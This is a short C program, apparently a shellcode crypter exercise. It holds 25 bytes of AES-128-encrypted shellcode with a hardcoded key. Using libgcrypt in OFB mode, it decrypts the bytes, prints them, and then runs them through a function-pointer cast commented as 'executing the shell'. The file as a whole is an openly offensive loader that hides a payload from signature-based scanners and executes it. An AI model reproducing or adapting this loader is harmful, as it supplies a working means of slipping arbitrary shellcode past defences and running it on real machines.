#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <gcrypt.h>

#define SIZE_OF_SHELL 25

char *key = "AbdulrahmanAlhsoahni";
char iv[] = "\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA";		 
char ctr[] = "\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA"; 

char encShellcode[] = "\x30\xc3\x32\xef\x81\x7e\xb1\x2b\xe3\x97\x16\x06\x4b\xcd\xf8\x4e\x9e\xaa\x21\x60\x32\x2a\xeb\xff\xbd";

int main()
{
    int myci = gcry_cipher_map_name("aes128");
    char *decryptedShellcode = malloc(SIZE_OF_SHELL);
    
    gcry_cipher_hd_t handler;
    gcry_cipher_open(&handler, myci, GCRY_CIPHER_MODE_OFB, 0);
    gcry_cipher_setkey(handler, key, 16);
    gcry_cipher_setiv(handler, iv, 16);
    gcry_cipher_setctr(handler, ctr, 16);
    gcry_cipher_decrypt(handler, decryptedShellcode, SIZE_OF_SHELL, encShellcode, SIZE_OF_SHELL);
    
    printf("Decrypted Shellcode = ");
    int _;
    for( _ = 0 ; _ < SIZE_OF_SHELL; _++ )
    {
        printf("\\x%02x", decryptedShellcode[_]);
    }
    printf("\n");
    int (*ret)() = (int(*)())decryptedShellcode;   
    ret();                               // executing the shell 
    
    gcry_cipher_close(handler);
    free(decryptedShellcode);
return 0;
}
